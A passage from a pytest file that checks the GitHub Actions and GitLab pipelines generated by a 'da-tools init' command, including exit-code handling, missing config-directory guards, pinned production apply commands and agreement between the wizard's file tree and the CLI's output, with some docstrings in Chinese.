                f"got {p.stdout[-400:]!r}"
            )
    if state == "first_import":
        assert "first import" in p.stdout, (
            "an empty baseline that IS correct must say so, or the resulting "
            f"all-added report looks like the bug; got {p.stdout[-300:]!r}"
        )
    if state.startswith("export_ignored"):
        # The point is that the rule had NO effect. `want_files` above already
        # asserts the full set arrived; this pins the silence too, so a future
        # switch back to `git archive` cannot pass by adding a warning.
        assert p.stdout.strip() == "", (
            "an export-ignore rule must not change the baseline at all now "
            "that extraction goes through the index. Any output here means "
            f"the extraction path changed; got {p.stdout[-400:]!r}"
        )
    if state == "config_dir_is_a_submodule":
        assert "not a directory" in p.stdout, (
            "a gitlink at the config path must be a loud fault: the tree "
            "lookup used to resolve the commit it points at, which is absent "
            "here by definition, and the fault was filed as a first import. "
            f"got {p.stdout[-400:]!r}"
        )


# `flips` records the MEASURED counterfactual: whether the shipped step reaches
# a different outcome than the bare `docker run ... > report` this replaced.
# Five of these seven states are NOT new detection — `bash -e` already aborted
# the step on any non-zero status, so they were loud before. What the `rc > 1`
# branch buys there is a MESSAGE naming the cause, which matters but is a
# smaller claim than "now caught". Writing that down because the first draft of
# this PR's commit message claimed the guard was new detection, and the
# measurement below is what corrected it.
@pytest.mark.skipif(
    any(shutil.which(t) is None for t in _SHELL_TOOLS),
    reason=f"executing the generated step needs {_SHELL_TOOLS} on PATH",
)
@pytest.mark.parametrize("state,rc,report,want_rc,want_in_stdout,flips", [
    # ⭐ THE fix. config-diff signals "changes detected" with exit 1, and this
    # job runs on every PR that touches conf.d/ — so before this change the
    # step failed on the ordinary case, and `Post PR comment` (which inherits
    # an implicit success()) never ran. The blast-radius comment #1358 is about
    # could not be posted at all on any PR that actually changed config.
    # The payload is opaque to the step, which only moves bytes — so it names
    # no tenant (dev-rules #2). What matters is only that it is non-empty.
    ("changes_detected", 1, "# Blast radius\n\n- 1 tenant changed\n", 0, "",
     True),
    # ⭐ The other flip: exit 0 with nothing on stdout used to SUCCEED, and an
    # empty file went on to the comment step.
    ("zero_but_empty_report", 0, "", 1, "empty report", True),
    ("no_changes", 0, "# No configuration changes\n", 0, "", False),
    # Already loud before this change (bash -e). Pinned for the MESSAGE.
    ("caller_error", 2, "", 2, "expected 0 or 1", False),
    ("image_pull_failed", 125, "", 125, "expected 0 or 1", False),
    ("oom_killed", 137, "", 137, "expected 0 or 1", False),
    # Exit 1 with an empty report: an unknown subcommand leaves the entrypoint
    # exiting 1, which by status alone is indistinguishable from "changes
    # detected". The status was already fatal before; what is new is that the
    # step now distinguishes the two at all, via the report.
    ("one_but_empty_report", 1, "", 1, "empty report", False),
    # ⭐ The head side had the same hole the baseline side did, and the guard
    # added above for the EMPTY report is what let it through: with CONFIG_DIR
    # naming a path that is not in the repo, both `-v` mounts materialise as
    # empty directories (a bind mount creates a missing host path rather than
    # failing), the tool exits 0, and it prints a 322-byte "no changes"
    # report — non-empty, so `[ ! -s ]` passes it and the comment publishes.
    # Green and silent on every future run. The stub's rc/report here are
    # deliberately the SUCCESS shape: the step must fail before reaching them.
    ("head_config_dir_missing", 0, "# No configuration changes\n", 1,
     "does not exist in this pull request", True),
])
def test_generated_blast_radius_step_honours_the_exit_contract(
    generated, tmp_path, state, rc, report, want_rc, want_in_stdout, flips,
) -> None:
    """Execute the shipped `Config diff (blast radius)` step against a stub.

    ⛔ Until this existed, the two guards in that step had no executing
    coverage anywhere in the tree — their only pin was the verbatim text in
    `_EXPECTED_GH_GENERATE`, and a text pin proves the body was not EDITED, not
    that it is CORRECT. That is the same gap that let #1358 ship: this module's
    own header used to state that it does not execute the shell it generates.

    The stub stands in for `docker` only. It cannot check that the mounts are
    right — that needs a real daemon and a real image — so this test is scoped
    to the contract the step applies to whatever the tool returns.
    """
    step, wf_env, job_env = _extract_step(generated[("github", "kustomize")],
                                          "Config diff (blast radius)")
    work = tmp_path / state
    work.mkdir()
    if state != "head_config_dir_missing":
        # What `actions/checkout` would have put there. Created for every
        # other state so the head-side guard is satisfied and each case
        # exercises the contract it is actually about — and NOT created for
        # the one state that is about the guard itself.
        (work / wf_env["CONFIG_DIR"]).mkdir(parents=True)
    p = _run_generated_step(
        step, wf_env, job_env, work, base_sha="unused-by-this-step",
        # This step binds nothing itself; CONFIG_DIR and DA_TOOLS_IMAGE come
        # from the workflow scope. `_resolve_step_env` asserts that absence
        # rather than merely tolerating it, so a step that starts binding
        # something cannot slip past under this flag.
        expect_step_env=False,
        stub_docker=(rc, report),
    )
    assert p.returncode == want_rc, (
        f"[{state}] config-diff exited {rc} with a "
        f"{'non-empty' if report else 'empty'} report, so the step should exit "
        f"{want_rc}; it exited {p.returncode}.\n"
        f"stdout: {p.stdout[-600:]!r}\nstderr: {p.stderr[-600:]!r}"
    )
    if want_in_stdout:
        assert want_in_stdout in p.stdout, (
            f"[{state}] the step failed as required but its ::error:: does not "
            f"say why — {want_in_stdout!r} is not in {p.stdout[-600:]!r}. An "
            "operator reading only the annotation has to guess between an "
            "image problem and a config problem."
        )
    published = work / ".output" / "blast-radius.md"
    if want_rc == 0:
        # The comment step runs only on success, so on this path the file IS
        # the customer-visible artifact. Asserting the exit status alone would
        # pass just as happily on a step that truncated it.
        assert published.read_text(encoding="utf-8") == report, (
            f"[{state}] the step succeeded but the report handed to the "
            "comment step is not what the tool produced."
        )


def test_the_apply_pins_cover_every_deploy_method() -> None:
    """⛔ Anti-vacuity floor, derived from the parser rather than from the pins.

    Both tables are consumed by `[deploy]` lookup, so a deploy method that is
    missing from them would simply never be graded — the silent-retirement
    shape this file has been bitten by before (`_EXPECTED_GL_JOB_RULES`,
    `_NEEDS`). Keying the floor off `DEPLOY_CHOICES` means adding a deploy
    method to the CLI forces a decision about its apply body.
    """
    for label, table in (("GitHub", _EXPECTED_GH_APPLY),
                         ("GitLab", _EXPECTED_GL_APPLY)):
        assert set(table) == set(DEPLOY_CHOICES), (
            f"the {label} apply pin covers {sorted(table)} but the CLI offers "
            f"{sorted(DEPLOY_CHOICES)} — an unpinned deploy method ships its "
            "production apply path with nothing checking it."
        )
        for deploy, commands in table.items():
            assert commands, (
                f"the {label} apply pin for {deploy!r} is empty, which grades "
                "every possible body as correct."
            )


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_apply_stage_body_is_pinned_on_both_legs(generated, ci, deploy) -> None:
    """The production apply path is the highest-consequence text we generate.

    It runs `kubectl apply` / `helm upgrade` / `argocd app sync --prune` against
    a cluster under `environment: production`. Everything else this file asserts
    is about whether that stage RUNS; this is the only thing asserting WHAT it
    runs.
    """
    root = generated[(ci, deploy)]

    if ci in ("github", "both"):
        wf = yaml.safe_load((root / _GH_WORKFLOW).read_text(encoding="utf-8"))
        got: list[str] = []
        for step in wf["jobs"]["apply"]["steps"]:
            if "run" in step:
                got.extend(_normalized_commands(str(step["run"])))
        assert got == _EXPECTED_GH_APPLY[deploy], (
            f"the GitHub apply body for --deploy {deploy} changed.\n"
            f"  expected: {_EXPECTED_GH_APPLY[deploy]}\n"
            f"  got:      {got}\n"
            "This is a production cluster write. If the change is intended, "
            "update the pin in the same commit and say why in the message — do "
            "not loosen the comparison."
        )

    if ci in ("gitlab", "both"):
        pipe = yaml.safe_load((root / _GL_PIPELINE).read_text(encoding="utf-8"))
        apply_jobs = [
            body for name, body in pipe.items()
            if isinstance(body, dict) and body.get("stage") == "apply"
        ]
        assert len(apply_jobs) == 1, (
            f"expected exactly one GitLab job in the apply stage, found "
            f"{len(apply_jobs)}"
        )
        got_gl: list[str] = []
        for line in apply_jobs[0].get("script", []):
            got_gl.extend(_normalized_commands(str(line)))
        assert got_gl == _EXPECTED_GL_APPLY[deploy], (
            f"the GitLab apply body for --deploy {deploy} changed.\n"
            f"  expected: {_EXPECTED_GL_APPLY[deploy]}\n"
            f"  got:      {got_gl}\n"
            "Same reasoning as the GitHub leg above."
        )


# ⛔ Deliberately NOT the fixture's namespace, and not the CLI default. If this
# test ran on `monitoring`, a generator that hard-coded the string instead of
# threading the --namespace argument through would still satisfy it — the
# assertion would be comparing the default to itself. A value that could only
# have arrived by being passed in is what makes the check mean anything.
_PROBE_NAMESPACE = "da-probe-ns"


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_declared_variable_values_match_their_source(tmp_path, ci, deploy) -> None:
    """Every knob the pipeline DECLARES must carry the value its source says.

    ⛔ An earlier round wired these knobs up so that a declared variable is
    always read by something (the #1361 dead-knob class). That check is about
    the NAME. Nothing looked at the VALUE, and a wrong value fails in the
    quietest possible direction: measured, changing `CONFIG_DIR: conf.d` to
    `configs` on BOTH legs left 318 passed while `run_init` still wrote only
    `conf.d/`. The GitHub leg mounts
    ``-v ${{ github.workspace }}/${{ env.CONFIG_DIR }}:/data/conf.d:ro`` and
    docker CREATES a missing bind source as an empty directory, so Stage 1 then
    validates nothing and says so approvingly — measured directly:
    `validate-config --config-dir <empty dir>` exits 0 with `Result: PASS`,
    while a genuinely absent directory exits 2. The customer's only gate goes
    green having read zero files.

    Both expectations are DERIVED, not transcribed: the config directory comes
    from walking what `run_init` actually wrote, and the namespace from the
    config that fixture was built with.
    """
    root = tmp_path / "out"
    ip.run_init(
        {
            "ci": ci,
            "deploy": deploy,
            "rule_packs": ["mariadb"],
            "tenants": ["db-a"],
            "namespace": _PROBE_NAMESPACE,
            "da_tools_image": "ghcr.io/vencil/da-tools:latest",
        },
        str(root),
    )
    written = _files_written(root)

    holders = {p.rsplit("/", 1)[0] for p in written if p.endswith("_defaults.yaml")}
    assert len(holders) == 1, (
        f"expected exactly one directory to hold _defaults.yaml, got {holders}"
    )
    config_dir = holders.pop()

    checked = 0
    if ci in ("github", "both"):
        wf = yaml.safe_load((root / _GH_WORKFLOW).read_text(encoding="utf-8"))
        env = wf.get("env") or {}
        assert env.get("CONFIG_DIR") == config_dir, (
            f"GitHub leg declares CONFIG_DIR={env.get('CONFIG_DIR')!r} but "
            f"`da-tools init` wrote the tenant config into {config_dir!r}. The "
            "workflow mounts that path into the validator; a wrong value is a "
            "green Stage 1 over an empty directory, not a red one."
        )
        checked += 1
        if "MONITORING_NS" in env:
            assert env["MONITORING_NS"] == _PROBE_NAMESPACE, (
                f"GitHub leg declares MONITORING_NS={env['MONITORING_NS']!r}, "
                f"expected the namespace init was given "
                f"({_PROBE_NAMESPACE!r})."
            )
            checked += 1

    if ci in ("gitlab", "both"):
        pipe = yaml.safe_load((root / _GL_PIPELINE).read_text(encoding="utf-8"))
        variables = pipe.get("variables") or {}
        assert variables.get("CONFIG_DIR") == config_dir, (
            f"GitLab leg declares CONFIG_DIR={variables.get('CONFIG_DIR')!r} "
            f"but `da-tools init` wrote the tenant config into {config_dir!r}."
        )
        checked += 1
        if "MONITORING_NS" in variables:
            assert variables["MONITORING_NS"] == _PROBE_NAMESPACE, (
                f"GitLab leg declares "
                f"MONITORING_NS={variables['MONITORING_NS']!r}, expected "
                f"{_PROBE_NAMESPACE!r}."
            )
            checked += 1

    # Anti-vacuity floor. ⛔ An earlier version of this comment claimed it caught
    # "the generators stop emitting an env:/variables: block at all" — that is
    # NOT what it does, and stating it wrongly is worse than not stating it,
    # because the next reader may weaken the assertions above believing the
    # floor backstops them. The CONFIG_DIR comparisons are unconditional, so a
    # missing key already fails there (`env.get(...)` returns None, measured:
    # 6 red). What this floor actually catches is narrower: a future edit that
    # wraps BOTH legs' checks in `if "X" in env:` the way MONITORING_NS is
    # wrapped, at which point every assertion becomes skippable and the test
    # would pass having compared nothing.
    assert checked >= 1, (
        f"--ci {ci} --deploy {deploy} produced no declared variable to check — "
        "every comparison above was skipped, so this test verified nothing."
    )


@_needs_node
@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_portal_file_tree_matches_what_init_writes(
    tmp_path, generated, ci, deploy,
) -> None:
    """The wizard's file tree is a claim about the CLI, so hold it to the CLI.

    ⛔ This is the assertion that was missing when the wizard promised
    ``kustomize/`` and ``argocd/`` for ``--deploy argocd``. ``run_init``
    scaffolds deployment files for ``--deploy kustomize`` ONLY, so the argocd
    user was shown two directories that never arrive — and the portal's own
    Vitest suite pinned the wrong answer in place (``emits argocd/ ONLY when
    deploy=argocd``), which is why five rounds of review over these two
    generators never surfaced it: every existing test agreed with the wizard.
    Measured before this test existed: with the old tree restored, the full
    file ran 297 passed.

    Both sides are read from the artifact — the portal's exported path list and
    a walk of the directory run_init really wrote — so neither can be satisfied
    by a generator that merely *says* the right thing.
    """
    claimed = set(json.loads(_call_portal(
        tmp_path,
        "cicdGeneratedPaths",
        {"ci": ci, "deploy": deploy, "tenants": ["db-a"], "packs": ["mariadb"]},
    )))
    actual = _files_written(generated[(ci, deploy)])

    assert _ALWAYS_WRITTEN <= actual, (
        f"run_init wrote {sorted(actual)} for --ci {ci} --deploy {deploy} — "
        "too little to compare against; check the fixture, not the wizard."
    )
    assert claimed == actual, (
        f"the CI/CD wizard's file tree disagrees with `da-tools init --ci {ci} "
        f"--deploy {deploy}`.\n"
        f"  promised by the wizard, never written: {sorted(claimed - actual)}\n"
        f"  written by the CLI, not shown: {sorted(actual - claimed)}\n"
        "The wizard is the copy; edit cicdGeneratedPaths in generators.js "
        "(then rebuild docs/assets/dist/). Do NOT silence this by widening the "
        "comparison — the whole point is that the two must be equal."
    )


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-v"]))


class TestGitHubLegDefectsFoundInRoundSeven:
    """第七輪盲審 lens W：四個既有缺陷各自讓一段出貨的 pipeline 不能用。

    共同形狀：**同一個危害在這份檔案的別處已經被處理過了**，只是沒套到這幾個
    位置——所以修法是把既有的作法補齊，不是發明新的。
    """

    def _gh(self, deploy: str) -> dict:
        return yaml.safe_load(ip._gen_github_actions(
            'monitoring', 'ghcr.io/vencil/da-tools:latest', deploy))

    @pytest.mark.parametrize('deploy', ['kustomize', 'helm', 'argocd'])
    def test_stage_one_refuses_a_config_dir_that_is_not_there(self, deploy):
        """⛔ `docker -v` 會**建立**不存在的 host 路徑而不是失敗。

        於是一個指錯（或搬走）的 `CONFIG_DIR` 掛進來的是空目錄，
        `validate-config` 解析 0 個檔案、印 `Result: PASS`、exit 0——一個永遠
        綠而且什麼都沒驗的 required check。實測：

            $ docker run --rm -v /tmp/ws2/conf.d:/data/conf.d:ro img ls /data/conf.d
            []                       # 而且 /tmp/ws2/conf.d 是 docker 剛建的
            $ validate_config.py --config-dir /tmp/emptyconf
            Total: 5 checks | 5 pass | 0 warn | 0 fail   →   rc=0

        config-diff 那一步 170 行後就帶著這個守衛（註解自己寫「a blast-radius
        gate that is green and silent forever」），Stage 1 沒有——而 Stage 1 是
        更糟的那半，因為 PR 上連一個提示都沒有。
        """
        steps = self._gh(deploy)['jobs']['validate']['steps']
        body = next(s['run'] for s in steps
                    if s.get('name', '').startswith('Validate config'))
        assert 'if [ ! -d "${{ env.CONFIG_DIR }}" ]; then' in body, (
            f'{deploy}: Stage 1 沒有 CONFIG_DIR 存在性守衛——掛進空目錄之後'
            f'它會綠著什麼都不驗。\n{body}')
        assert '::error::' in body and 'exit 1' in body, body

    def test_the_argocd_apply_job_has_the_cli_it_invokes(self):
        """⛔ `ubuntu-latest` 沒有 `argocd`。

        GitHub 的 runner-image manifest 列出 helm / kind / kubectl / kustomize /
        minikube——沒有 argocd。原本的 job 既沒有安裝步驟也沒有映像，於是每一次
        dispatch 都是 `argocd: command not found` / exit 127。GitLab 的同胞一直
        都 pin 著映像（`$DA_ARGOCD_IMAGE`），這是腿間不對稱、不是範圍問題。
        """
        job = self._gh('argocd')['jobs']['apply']
        assert job.get('container'), (
            'argocd 的 GitHub apply job 沒有 container:——它呼叫一個 '
            f'ubuntu-latest 上不存在的 binary。\n{job}')
        assert job['container']['image'] == ip.ARGOCD_CLI_IMAGE, job['container']
        # ⛔ 兩條腿共用同一個 pin：分成兩份就是下一次版本漂移。
        assert ip._GITLAB_APPLY_IMAGES['argocd'][1] == ip.ARGOCD_CLI_IMAGE

    @pytest.mark.parametrize('deploy', ['kustomize', 'helm', 'argocd'])
    def test_the_only_writable_mount_runs_as_the_runner(self, deploy):
        """⛔ 映像以 `USER nonroot`（uid 10001）結尾，而 `mkdir -p .output` 是
        runner 使用者（uid 1001, umask 022）建的目錄。

        容器因此無法在自己的輸出目錄裡建檔，`generate-routes -o` 直接 EACCES
        ——每一個 PR 都死在這一步，而整個 `pull-requests: write` 權限存在的理由
        （blast-radius comment）永遠到不了。

        對照組寫在下一步：config-diff 是在 **host** 上重導向，所以它碰不到這個
        問題；只有這一步是把 `-o` 交給容器內部。
        """
        steps = self._gh(deploy)['jobs']['generate']['steps']
        body = next(s['run'] for s in steps
                    if s.get('name') == 'Generate Alertmanager routes')
        assert '--user $(id -u):$(id -g)' in body, (
            f'{deploy}: 唯一可寫的 bind mount 沒有 --user——容器寫不進去。'
            f'\n{body}')

    @pytest.mark.parametrize('deploy', ['kustomize', 'helm', 'argocd'])
    def test_the_push_leg_watches_the_same_trees_as_the_pr_leg(self, deploy):
        """⛔ `push` 原本只看 `conf.d/**`，`pull_request` 看三棵樹。

        而 `validate` 裡的自訂規則治理 lint 掃的是 `rule-packs/custom`——所以一個
        允許直推預設分支的 repo，對以那種方式推上來的租戶自撰 PromQL 完全沒有
        lint。兩者相等是刻意的：只改其中一個就會再漂開。
        """
        on = self._gh(deploy)
        on = on[True] if True in on else on['on']
        assert on['push']['paths'] == on['pull_request']['paths'], (
            f"{deploy}: push 與 pull_request 的 paths 不一致——"
            f"push={on['push']['paths']} pr={on['pull_request']['paths']}")
